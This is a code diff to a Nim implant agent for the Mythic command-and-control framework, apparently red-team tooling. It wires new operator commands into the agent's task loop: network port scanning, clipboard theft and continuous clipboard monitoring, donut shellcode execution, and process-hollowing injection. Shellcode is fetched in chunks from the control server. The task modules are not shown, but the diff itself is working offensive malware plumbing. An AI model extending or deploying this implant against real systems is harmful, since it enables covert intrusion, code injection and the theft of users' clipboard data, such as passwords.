@@ -1,4 +1,4 @@
-import std/[json, random, os, base64, tables, times]
+import std/[json, random, os, base64, tables, times, strutils, strformat]
 import config
 import profiles/http_profile
 import utils/sysinfo
@@ -20,6 +20,9 @@ import tasks/rm
 import tasks/pty
 import tasks/socks
 
+# Cross-platform commands
+import tasks/portscan
+
 # Windows-only commands
 when defined(windows):
   import tasks/execute_assembly
@@ -31,6 +34,10 @@ when defined(windows):
   import tasks/rev2self
   import tasks/screenshot
   import tasks/get_av
+  import tasks/clipboard
+  import tasks/clipboard_monitor
+  import tasks/donut
+  import tasks/inject_hollow
 
 # Conditional imports for Windows-only features
 when defined(windows):
@@ -38,7 +45,7 @@ when defined(windows):
 
 type
   BackgroundTaskType = enum
-    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject
+    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow
   
   BackgroundTaskState = object
     taskType: BackgroundTaskType
@@ -49,6 +56,9 @@ type
     fileData: seq[byte]  # For execute-assembly file accumulation
     params: JsonNode  # Store original params for execute-assembly
   
+  MonitoringTaskType* = enum
+    mtClipboardMonitor, mtPortscan
+  
   Agent* = ref object
     config: Config
     profile: HttpProfile
@@ -58,10 +68,12 @@ type
     jitter: int
     taskResponses: seq[JsonNode]
     backgroundTasks: Table[string, BackgroundTaskState]  # taskId -> state
+    activeMonitoringTasks: Table[string, MonitoringTaskType]  # Task ID -> task type
 
 proc newAgent*(): Agent =
   ## Create a new agent instance
   result = Agent()
+  result.activeMonitoringTasks = initTable[string, MonitoringTaskType]()
   result.config = getConfig()
   result.profile = newHttpProfile()
   result.callbackUuid = result.config.uuid  # Initialize with payload UUID
@@ -593,6 +605,101 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           agent.taskResponses.add(response)
           continue
       
+      of "portscan":
+        if agent.config.debug:
+          echo "[DEBUG] Starting portscan (background task)"
+        response = portscan(taskId, params)
+        # Track as background task if processing
+        if response.hasKey("status") and response["status"].getStr() == "processing":
+          agent.activeMonitoringTasks[taskId] = mtPortscan
+          agent.taskResponses.add(response)
+          continue
+      
+      of "clipboard":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing clipboard command"
+          response = clipboard(taskId, params)
+        else:
+          response = %*{
+            "task_id": taskId,
+            "completed": true,
+            "status": "error",
+            "user_output": "clipboard command is only available on Windows"
+          }
+      
+      of "clipboard_monitor":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Starting clipboard_monitor (background task)"
+          response = clipboardMonitor(taskId, params)
+          # Track as background task if processing
+          if response.hasKey("status") and response["status"].getStr() == "processing":
+            agent.activeMonitoringTasks[taskId] = mtClipboardMonitor
+            agent.taskResponses.add(response)
+            continue
+        else:
+          response = %*{
+            "task_id": taskId,
+            "completed": true,
+            "status": "error",
+            "user_output": "clipboard_monitor command is only available on Windows"
+          }
+      
+      of "donut":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Starting donut execution"
+          response = donut(taskId, params)
+          agent.taskResponses.add(response)
+          
+          # Track as background task for file download
+          var state = BackgroundTaskState(
+            taskType: btDonut,
+            path: "",
+            fileId: params["uuid"].getStr(),
+            totalChunks: 0,
+            currentChunk: 1,
+            fileData: @[],
+            params: params
+          )
+          agent.backgroundTasks[taskId] = state
+          continue
+        else:
+          response = %*{
+            "task_id": taskId,
+            "completed": true,
+            "status": "error",
+            "user_output": "donut command is only available on Windows"
+          }
+      
+      of "inject_hollow":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Starting inject_hollow"
+          response = injectHollow(taskId, params)
+          agent.taskResponses.add(response)
+          
+          # Track as background task for file download
+          var state = BackgroundTaskState(
+            taskType: btInjectHollow,
+            path: "",
+            fileId: params["uuid"].getStr(),
+            totalChunks: 0,
+            currentChunk: 1,
+            fileData: @[],
+            params: params
+          )
+          agent.backgroundTasks[taskId] = state
+          continue
+        else:
+          response = %*{
+            "task_id": taskId,
+            "completed": true,
+            "status": "error",
+            "user_output": "inject_hollow command is only available on Windows"
+          }
+      
       else:
         # Command not implemented
         if agent.config.debug:
@@ -619,6 +726,31 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           echo "[DEBUG] Task output length: ", output.len, " bytes (first 100 chars): ", output[0..<min(100, output.len)]
     
     agent.taskResponses.add(response)
+
+proc checkBackgroundTasks*(agent: var Agent) =
+  ## Check all active monitoring tasks (clipboard_monitor, portscan)
+  ## This gets called every loop iteration to keep background tasks responsive
+  var completedTasks: seq[string] = @[]
+  
+  for taskId, taskType in agent.activeMonitoringTasks:
+    var result: JsonNode = nil
+    
+    case taskType
+    of mtClipboardMonitor:
+      when defined(windows):
+        result = checkClipboardMonitor(taskId)
+    of mtPortscan:
+      result = checkPortscan(taskId)
+    
+    if result != nil:
+      agent.taskResponses.add(result)
+      # If completed, mark for removal
+      if result.hasKey("completed") and result["completed"].getBool():
+        completedTasks.add(taskId)
+  
+  # Remove completed tasks
+  for taskId in completedTasks:
+    agent.activeMonitoringTasks.del(taskId)
 
 proc postResponses*(agent: var Agent) =
   ## Post task responses back to Mythic
@@ -825,6 +957,52 @@ proc postResponses*(agent: var Agent) =
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
+            
+            of btDonut:
+              when defined(windows):
+                # Process incoming file chunks for donut shellcode
+                if taskResp.hasKey("chunk_data"):
+                  let chunkData = taskResp["chunk_data"].getStr()
+                  let totalChunks = taskResp["total_chunks"].getInt()
+                  state.totalChunks = totalChunks
+                  
+                  # Process the chunk and get next request or final result
+                  let donutResp = processDonutChunk(
+                    taskId, state.params, chunkData, totalChunks, 
+                    state.currentChunk, state.fileData
+                  )
+                  agent.taskResponses.add(donutResp)
+                  
+                  if donutResp.hasKey("completed") and donutResp["completed"].getBool():
+                    agent.backgroundTasks.del(taskId)
+                    if agent.config.debug:
+                      echo "[DEBUG] Donut complete"
+                  else:
+                    state.currentChunk += 1
+                    agent.backgroundTasks[taskId] = state
+            
+            of btInjectHollow:
+              when defined(windows):
+                # Process incoming file chunks for inject_hollow shellcode
+                if taskResp.hasKey("chunk_data"):
+                  let chunkData = taskResp["chunk_data"].getStr()
+                  let totalChunks = taskResp["total_chunks"].getInt()
+                  state.totalChunks = totalChunks
+                  
+                  # Process the chunk and get next request or final result
+                  let injectResp = processInjectHollowChunk(
+                    taskId, state.params, chunkData, totalChunks, 
+                    state.currentChunk, state.fileData
+                  )
+                  agent.taskResponses.add(injectResp)
+                  
+                  if injectResp.hasKey("completed") and injectResp["completed"].getBool():
+                    agent.backgroundTasks.del(taskId)
+                    if agent.config.debug:
+                      echo "[DEBUG] Inject hollow complete"
+                  else:
+                    state.currentChunk += 1
+                    agent.backgroundTasks[taskId] = state
     except:
       if agent.config.debug:
         echo "[DEBUG] Failed to parse post_response reply: ", getCurrentExceptionMsg()
@@ -909,6 +1087,9 @@ proc runAgent*() =
     let socksResponses = checkActiveSocksConnections()
     for response in socksResponses:
       agentInstance.taskResponses.add(%*{"socks": [response]})
+    
+    # Check background tasks (clipboard_monitor, portscan)
+    agentInstance.checkBackgroundTasks()
     
     # Send responses back (handles background task state machine)
     agentInstance.postResponses()
